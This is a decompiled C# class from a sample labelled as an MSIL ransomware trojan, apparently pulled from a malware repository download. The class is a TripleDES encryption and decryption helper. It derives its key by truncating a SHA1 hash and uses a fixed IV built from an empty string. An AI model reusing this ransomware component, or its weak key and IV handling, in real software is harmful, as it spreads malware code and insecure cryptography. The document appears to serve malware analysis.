// Decompiled with JetBrains decompiler
// Type: fuck_rats_antivirus.Class1
// Assembly: fuck rats antivirus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 90269513-6CF5-4CEA-B0D4-CF5FD0C1F7C3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-935faf22f44af34fc970f49b16d29cb336918c121c3ca2c7bd3a1cf89dc642d1.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace fuck_rats_antivirus
{
  public class Class1
  {
    private TripleDESCryptoServiceProvider gvddsawrfvdv;

    private byte[] TruncateHas(string key, int length) => (byte[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) new SHA1CryptoServiceProvider().ComputeHash(Encoding.Unicode.GetBytes(key)), (Array) new byte[checked (length - 1 + 1)]);

    public Class1(string key)
    {
      this.gvddsawrfvdv = new TripleDESCryptoServiceProvider();
      this.gvddsawrfvdv.Key = this.TruncateHas(key, this.gvddsawrfvdv.KeySize / 8);
      this.gvddsawrfvdv.IV = this.TruncateHas("", this.gvddsawrfvdv.BlockSize / 8);
    }

    public string EncryptData(string plaintext)
    {
      byte[] bytes = Encoding.Unicode.GetBytes(plaintext);
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, this.gvddsawrfvdv.CreateEncryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(bytes, 0, bytes.Length);
      cryptoStream.FlushFinalBlock();
      return Convert.ToBase64String(memoryStream.ToArray());
    }

    public string DecryptData(string encryptedtext)
    {
      byte[] buffer = Convert.FromBase64String(encryptedtext);
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, this.gvddsawrfvdv.CreateDecryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(buffer, 0, buffer.Length);
      cryptoStream.FlushFinalBlock();
      return Encoding.Unicode.GetString(memoryStream.ToArray());
    }
  }
}
